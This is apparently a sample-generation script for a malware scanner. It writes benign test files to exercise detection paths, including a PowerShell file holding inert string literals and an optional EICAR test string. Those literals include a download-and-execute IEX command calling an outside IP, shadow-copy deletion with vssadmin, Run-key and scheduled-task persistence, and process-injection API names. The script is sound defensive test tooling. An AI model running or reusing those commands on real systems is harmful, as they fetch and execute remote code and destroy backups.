"""Writes some harmless files to samples/ so there is something to scan.

None of this is malware. They are ordinary files picked to push different
paths through the pipeline: clean text, a script that only *mentions*
suspicious API names, a high-entropy blob that looks packed, a broken PE
header, and a copy of a real system binary.

    python scripts/make_samples.py

EICAR is supported but off by default. Writing it to disk will make your
antivirus quarantine the file and throw an alert, which is the correct
reaction, but it is startling if you were not expecting it. Pass --eicar if
that is what you want to test.
"""
from __future__ import annotations

import argparse
import os
import random
import shutil
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from malscan.config import CONFIG  # noqa: E402

OUT = CONFIG.sample_dir


def write(name: str, data: bytes) -> Path:
    path = OUT / name
    path.write_bytes(data)
    print(f"  {name:<34} {len(data):>10,} bytes")
    return path


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--eicar", action="store_true",
                    help="also write the EICAR test file (your AV will react)")
    args = ap.parse_args()

    OUT.mkdir(parents=True, exist_ok=True)
    print(f"Writing sample files to {OUT}\n")

    # 1. Ordinary text -- should score very low.
    write(
        "01_clean_readme.txt",
        (
            "MalScan AI sample file\n"
            "======================\n\n"
            "This is an ordinary text file with nothing interesting in it. "
            "It exists so you can see what a clean result looks like.\n"
        ).encode(),
    )

    # 2. A script that only *mentions* suspicious API names. It does nothing --
    #    every call is inside a string literal -- but it exercises the string
    #    miner and several detection rules.
    write(
        "02_suspicious_looking_script.ps1",
        (
            "# Harmless demo file. Nothing below is executed -- these are\n"
            "# string literals chosen to trip the string miner and rules.\n"
            "$notes = @(\n"
            "  'powershell -EncodedCommand <base64>',\n"
            "  'IEX(New-Object Net.WebClient).DownloadString(\"http://198.51.100.23/a\")',\n"
            "  'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',\n"
            "  'schtasks /create /sc minute /mo 1',\n"
            "  'vssadmin delete shadows /all /quiet',\n"
            "  'VirtualAllocEx, WriteProcessMemory, CreateRemoteThread'\n"
            ")\n"
            "Write-Output 'This script only prints a list of strings.'\n"
        ).encode(),
    )

    # 3. High-entropy blob -- looks packed/encrypted to an entropy check.
    rng = random.Random(1337)
    write("03_high_entropy_blob.bin",
          bytes(rng.randrange(256) for _ in range(256 * 1024)))

    # 4. A file that claims to be a PE but is truncated garbage. Tests the
    #    "starts with MZ but will not parse" path.
    write("04_broken_pe_header.exe",
          b"MZ\x90\x00\x03\x00\x00\x00" + os.urandom(2048))

    # 5. A real, genuinely benign Windows binary for comparison.
    for candidate in (
        Path(os.environ.get("SystemRoot", "C:/Windows")) / "System32" / "notepad.exe",
        Path(os.environ.get("SystemRoot", "C:/Windows")) / "System32" / "calc.exe",
        Path(sys.executable),
    ):
        if candidate.exists():
            dest = OUT / f"05_benign_real_binary_{candidate.name}"
            shutil.copy2(candidate, dest)
            print(f"  {dest.name:<34} {dest.stat().st_size:>10,} bytes")
            break

    # 6. A document-shaped file with macro-style markers.
    write(
        "06_macro_style_document.doc",
        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 500
        + b"AutoOpen" + b"\x00" * 40 + b"Document_Open" + b"\x00" * 40
        + b"Shell(" + b"\x00" * 200 + b"vbaProject.bin" + os.urandom(1024),
    )

    if args.eicar:
        # The industry-standard harmless scanner test string.
        eicar = (
            r"X5O!P%@AP[4\PZX54(P^)7CC)7}$"
            r"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        ).encode()
        write("07_eicar_test.txt", eicar)
        print("\n  NOTE: your antivirus will very likely quarantine that last "
              "file. That is the expected, correct reaction.")

    print("\nDone. Upload any of these on the Scan page.")
    if not args.eicar:
        print("(Re-run with --eicar to also write the EICAR test file.)")


if __name__ == "__main__":
    main()
